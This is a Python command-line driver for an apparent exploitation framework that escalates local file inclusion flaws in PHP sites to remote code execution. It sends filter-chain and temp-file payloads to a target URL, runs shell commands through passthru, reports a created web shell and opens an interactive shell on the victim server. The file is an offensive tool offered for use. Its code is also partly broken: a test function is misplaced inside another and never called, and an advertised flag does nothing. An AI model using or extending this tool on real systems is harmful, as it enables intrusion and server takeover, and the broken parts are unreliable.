#!/usr/bin/env python3
"""
Command-line interface for Elle-Est-Fit LFI to RCE Framework.
"""

import argparse
import sys
import logging
import importlib
import traceback
from typing import Callable, Optional
import textwrap

from . import __version__
from .core import LFI, info
from .exceptions import ElleEstFitError

logger = logging.getLogger("elle-est-fit")


def setup_logging(verbose: bool = False):
    """Configure logging based on verbosity level."""
    log_level = logging.DEBUG if verbose else logging.INFO
    log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    logging.basicConfig(level=log_level, format=log_format)
    
    # Print a message to verify logging is working
    if verbose:
        print("[*] Verbose logging enabled")


def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Elle-Est-Fit: LFI to RCE Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
        Examples:
          elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --technique php_filters
          elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --double-url-encode --custom-cmd 'id'
          elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --technique nginx_temp_files --php 'passthru("id");'
          elle-est-fit --dump-chain '<?php phpinfo(); ?>'
        """)
    )
    
    parser.add_argument('--version', action='version', version=f'Elle-Est-Fit v{__version__}')
    parser.add_argument('--test-chain', help='Test a specific PHP filter chain against the target URL')
    
    # Target options
    target_group = parser.add_argument_group('Target')
    target_group.add_argument('--url', help='Target URL with LFI vulnerability (use FUZZ as the placeholder for the LFI path)')
    
    # Technique options
    technique_group = parser.add_argument_group('Technique')
    technique_group.add_argument('--technique', help='Specific technique to use (default: auto-detect)')
    technique_group.add_argument('--list-techniques', action='store_true', help='List available techniques')
    technique_group.add_argument('--dump-chain', help='Generate and dump a PHP filter chain for the given PHP code')
    
    # Encoding options
    encoding_group = parser.add_argument_group('Encoding')
    encoding_group.add_argument('--double-url-encode', action='store_true', help='Apply double URL encoding')
    encoding_group.add_argument('--tamper', help='Python code for custom tampering function')
    
    # Payload options
    payload_group = parser.add_argument_group('Payload')
    payload_group.add_argument('--php', help='Custom PHP code to execute')
    payload_group.add_argument('--custom-cmd', help='Custom command to execute')
    
    # Output options
    output_group = parser.add_argument_group('Output')
    output_group.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    output_group.add_argument('-q', '--quiet', action='store_true', help='Suppress non-essential output')
    output_group.add_argument('--interactive', action='store_true', help='Start an interactive shell after exploitation')
    
    return parser.parse_args()


def list_available_techniques():
    """List all available techniques with their descriptions."""
    import pkgutil
    import inspect
    import importlib
    from .techniques.base import TechniqueBase
    
    print("Available techniques:")
    print("---------------------")
    
    # Find all modules in the techniques package
    techniques_path = 'elle_est_fit.techniques'
    for _, name, _ in pkgutil.iter_modules([techniques_path.replace('.', '/')]):
        if name == 'base':
            continue
            
        try:
            # Import the module
            module = importlib.import_module(f"{techniques_path}.{name}")
            
            # Find the technique class in the module
            for attr_name in dir(module):
                attr = getattr(module, attr_name)
                if (inspect.isclass(attr) and
                    issubclass(attr, TechniqueBase) and
                    attr != TechniqueBase):
                    
                    # Print the technique info
                    print(f"  {attr.name}: {attr.description}")
        except (ImportError, AttributeError) as e:
            print(f"  Error loading {name}: {str(e)}")
    
    print("\nUsage: --technique <technique_name>")


def parse_tamper_function(code_str: str) -> Optional[Callable[[str], str]]:
    """
    Parse and compile a tamper function from a string.
    
    Args:
        code_str: Python code string defining a tamper function
        
    Returns:
        Compiled function or None if parsing fails
    """
    if not code_str:
        return None
        
    try:
        # Create a namespace for the function
        namespace = {}
        
        # If the code doesn't define a function, wrap it in one
        if not code_str.strip().startswith('def tamper'):
            code_str = f"def tamper(payload):\n    {code_str}"
        
        # Compile and execute the code
        exec(code_str, namespace)
        
        # Return the tamper function
        return namespace.get('tamper')
    except Exception as e:
        logger.error(f"Error parsing tamper function: {str(e)}")
        return None


def interactive_shell(lfi_instance):
    """
    Start an interactive shell for command execution.
    
    Args:
        lfi_instance: Initialized and exploited LFI instance
    """
    print("\nStarting interactive shell. Type 'exit' or 'quit' to exit.")
    print("------------------------------------------------------")
    
    while True:
        try:
            # Get the command from the user
            cmd = input("shell> ")
            
            # Check if the user wants to exit
            if cmd.lower() in ['exit', 'quit', 'q']:
                break
                
            # Execute the command
            if cmd.strip():
                output = lfi_instance.shell(cmd)
                print(output)
        except KeyboardInterrupt:
            print("\nExiting interactive shell...")
            break
        except Exception as e:
            print(f"Error: {str(e)}")

    def test_chain(url, chain, verbose=False):
        """
        Test a PHP filter chain against a target URL.
        
        Args:
            url: Target URL with {} placeholder
            chain: PHP filter chain to test
            verbose: Whether to show verbose output
        """
        import requests
        
        complete_url = url.format(chain)
        print(f"Testing URL: {complete_url}")
        
        try:
            response = requests.get(complete_url, timeout=10)
            print(f"Response status code: {response.status_code}")
            
            if response.status_code == 200:
                print("\nResponse content:")
                print("------------------")
                print(response.text)
                
                # Try to detect common success markers
                detection_markers = ["ELLEESTFIT", "phpinfo", "uid=", "system"]
                for marker in detection_markers:
                    if marker in response.text:
                        print(f"\n[+] Success marker found: '{marker}' at position {response.text.find(marker)}")
            else:
                print(f"Request failed with status code: {response.status_code}")
        except Exception as e:
            print(f"Error making request: {str(e)}")


def main():
    """Main entry point for the CLI."""
    args = parse_args()
    
    # Configure logging
    setup_logging(args.verbose)
    
    # Process special commands that don't require a URL
    
    # List available techniques and exit
    if args.list_techniques:
        list_available_techniques()
        return 0
    
    # Handle the dump-chain command
    if args.dump_chain:
        try:
            from .payloads.filter_chain import generate_filter_chain
            php_code = args.dump_chain
            print(f"\nGenerating PHP filter chain for: {php_code}")
            chain = generate_filter_chain(php_code)
            print("\nPHP Filter Chain:")
            print("----------------------------------------")
            print(chain)
            print("----------------------------------------")
            print("Use this chain with your LFI vulnerability")
            return 0
        except Exception as e:
            print(f"Error generating filter chain: {str(e)}")
            if args.verbose:
                traceback.print_exc()
            return 1
    
    # Check if URL is required but not provided
    if not args.url:
        print("Error: --url is required unless --list-techniques or --dump-chain is specified")
        return 1
    
    try:
        print(f"[*] Targeting: {args.url}")
        
        # Parse the tamper function if provided
        tamper_func = parse_tamper_function(args.tamper) if args.tamper else None
        
        # Normalize URL to replace FUZZ with an empty placeholder
        url = args.url.replace('FUZZ', '{}')
        
        print("[*] Creating LFI instance...")
        # Create the LFI instance
        lfi = LFI(
            target=url,
            technique=args.technique,
            double_url_encode=args.double_url_encode,
            tamper=tamper_func,
            php_code=args.php,
            custom_cmd=args.custom_cmd,
            verbose=args.verbose
        )
        print("[*] Note: If you experience HTTP 414 errors (URI Too Long), try shorter payloads")
        print("[*] Attempting exploitation...")
        # Attempt to exploit
        if lfi.exploit():
            info(f"Exploitation successful! Shell created at {lfi.shell_path}")
            
            # Execute the custom command if provided
            if args.custom_cmd:
                print(f"\n[*] Executing command: {args.custom_cmd}")
                output = lfi.shell()
                print("\nCommand output:")
                print("---------------")
                print(output)
            
            # Start interactive shell if requested
            if args.interactive:
                interactive_shell(lfi)
            
            return 0
        else:
            info("Exploitation failed.")
            return 1
            
    except ElleEstFitError as e:
        logger.error(str(e))
        print(f"Error: {str(e)}")
        if args.verbose:
            traceback.print_exc()
        return 1
    except KeyboardInterrupt:
        logger.info("Operation interrupted by user.")
        print("\nOperation interrupted by user.")
        return 130
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        print(f"Unexpected error: {str(e)}")
        if args.verbose:
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())